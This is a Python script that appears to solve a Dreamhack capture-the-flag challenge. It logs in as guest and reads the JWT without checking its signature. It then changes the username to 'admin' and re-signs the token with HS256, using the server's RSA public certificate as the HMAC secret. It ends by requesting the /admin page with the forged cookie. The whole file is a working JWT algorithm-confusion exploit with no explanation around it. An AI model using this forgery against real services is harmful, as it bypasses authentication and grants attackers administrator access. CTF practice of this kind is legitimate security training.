import json
import base64
import hashlib
import hmac
import requests
import jwt
from datetime import datetime
from calendar import timegm
import base64
host = "host3.dreamhack.games:24475"
BASE_URL = f"http://{host}"

def get_token():
    s = requests.Session()
    data = {
        'username': 'guest',
        'password': 'guest'
    }
    response = s.post(f'{BASE_URL}/login', data=data)
    response.raise_for_status()  # HTTP 오류가 발생하면 예외를 발생시킵니다.
    return s.cookies['token']

tokens = []
tokens.append(get_token())
token = tokens[0]
with open('pub.crt', 'rb') as f:
    key = f.read()
algorithms = ['RS256']
payload = jwt.decode(token, key, algorithms=algorithms, options={"verify_signature": False})

# token forgery - construct header
header = {"alg": "HS256", "typ": "JWT"}
json_header = json.dumps(header, separators=(",", ":"), cls=None).encode()

# token forgery - construct payload
payload['username'] = 'admin'
for time_claim in ["exp", "iat", "nbf"]:
    if isinstance(payload.get(time_claim), datetime):
        payload[time_claim] = timegm(payload[time_claim].utctimetuple())
json_payload = json.dumps(payload, separators=(",", ":"), cls=None).encode("utf-8")

segments = []
segments.append(base64.urlsafe_b64encode(json_header).replace(b'=', b''))
segments.append(base64.urlsafe_b64encode(json_payload).replace(b'=', b''))

# token forgery - construct signature
signing_input = b".".join(segments)
signature = hmac.new(key, signing_input, hashlib.sha256).digest()
segments.append(base64.urlsafe_b64encode(signature).replace(b'=', b''))
forged_token = b'.'.join(segments).decode()
print(forged_token)
cookies = {'token': forged_token}
print(requests.get(url=f'{BASE_URL}/admin', cookies=cookies).text)